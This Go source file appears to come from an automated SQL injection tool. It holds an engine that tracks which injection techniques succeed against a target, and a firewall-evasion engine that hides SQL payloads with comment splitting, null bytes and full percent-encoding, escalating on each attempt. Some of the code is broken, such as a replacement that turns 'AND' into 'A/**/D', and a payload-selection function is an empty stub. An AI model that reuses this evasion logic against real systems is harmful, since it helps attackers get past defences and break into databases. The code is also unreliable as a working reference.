package core

import (
	"fmt"
	"strings"
	"sync"
)

type PayloadHistory struct {
	mu        sync.Mutex
	responses map[string][]int
	successes map[string]int
	failures  map[string]int
}

func NewPayloadHistory() *PayloadHistory {
	return &PayloadHistory{
		responses: make(map[string][]int),
		successes: make(map[string]int),
		failures:  make(map[string]int),
	}
}

type AdaptiveEngine struct {
	engine   *Engine
	history  *PayloadHistory
	dbms     string
	param    string
}

func NewAdaptiveEngine(e *Engine) *AdaptiveEngine {
	return &AdaptiveEngine{
		engine:  e,
		history: NewPayloadHistory(),
	}
}

func (a *AdaptiveEngine) RecordResult(payload string, bodyLen int, isInjection bool) {
	a.history.mu.Lock()
	defer a.history.mu.Unlock()

	payKey := payload[:minInt(len(payload), 50)]
	a.history.responses[payKey] = append(a.history.responses[payKey], bodyLen)

	if isInjection {
		a.history.successes[payKey]++
	} else {
		a.history.failures[payKey]++
	}
}

func (a *AdaptiveEngine) GetSuccessRate(payloadType string) float64 {
	a.history.mu.Lock()
	defer a.history.mu.Unlock()

	totalSuccess := 0
	totalFail := 0
	for key, s := range a.history.successes {
		if strings.Contains(key, payloadType) {
			totalSuccess += s
		}
	}
	for key, f := range a.history.failures {
		if strings.Contains(key, payloadType) {
			totalFail += f
		}
	}

	total := totalSuccess + totalFail
	if total == 0 {
		return 0
	}
	return float64(totalSuccess) / float64(total)
}

func (a *AdaptiveEngine) BestInjectionType() string {
	types := []string{"error", "boolean", "time", "union", "stacked"}
	bestType := "auto"
	bestRate := 0.0

	for _, t := range types {
		rate := a.GetSuccessRate(t)
		if rate > bestRate {
			bestRate = rate
			bestType = t
		}
	}

	if bestRate > 0.3 {
		a.engine.logInfo(fmt.Sprintf("Adaptive: best injection type is '%s' (%.0f%% success)", bestType, bestRate*100))
		return bestType
	}
	return "auto"
}

func (a *AdaptiveEngine) SelectPayloads(allPayloads interface{}, targetType string) []string {
	return []string{}
}

func (a *AdaptiveEngine) OptimizeParams() map[string]string {
	params := map[string]string{}

	successRate := a.GetSuccessRate("error")
	if successRate > 0.5 {
		params["mode"] = "error"
	} else {
		successRate = a.GetSuccessRate("boolean")
		if successRate > 0.5 {
			params["mode"] = "boolean"
		}
	}

	return params
}

type WAFBypassEngine struct {
	engine       *Engine
	bypassLevel  int
	commentDepth int
	caseToggle   bool
}

func NewWAFBypassEngine(e *Engine) *WAFBypassEngine {
	return &WAFBypassEngine{
		engine:       e,
		bypassLevel:  0,
		commentDepth: 1,
		caseToggle:   false,
	}
}

func (w *WAFBypassEngine) ObfuscatePayload(payload string, level int) string {
	if level <= 0 {
		return payload
	}

	result := payload

	if level >= 1 {
		result = strings.ReplaceAll(result, " ", "/**/")
	}

	if level >= 2 {
		result = strings.ReplaceAll(result, "OR", "O/**/R")
		result = strings.ReplaceAll(result, "AND", "A/**/D")
	}

	if level >= 3 {
		result = strings.ReplaceAll(result, "'", "%00'")
		keywords := []string{"SELECT", "UNION", "FROM", "WHERE", "AND", "OR"}
		for _, kw := range keywords {
			obf := ""
			for i, c := range kw {
				if i > 0 {
					obf += fmt.Sprintf("/**/")
				}
				obf += string(c)
			}
			result = strings.ReplaceAll(result, kw, obf)
		}
	}

	if level >= 4 {
		encoded := ""
		for _, c := range result {
			encoded += fmt.Sprintf("%%%02X", c)
		}
		result = encoded
	}

	return result
}

func (w *WAFBypassEngine) Escalate(payload string, lock *sync.Mutex) string {
	lock.Lock()
	defer lock.Unlock()

	w.bypassLevel++
	if w.bypassLevel%2 == 0 {
		w.commentDepth++
	}
	w.caseToggle = !w.caseToggle
	return w.ObfuscatePayload(payload, w.bypassLevel)
}
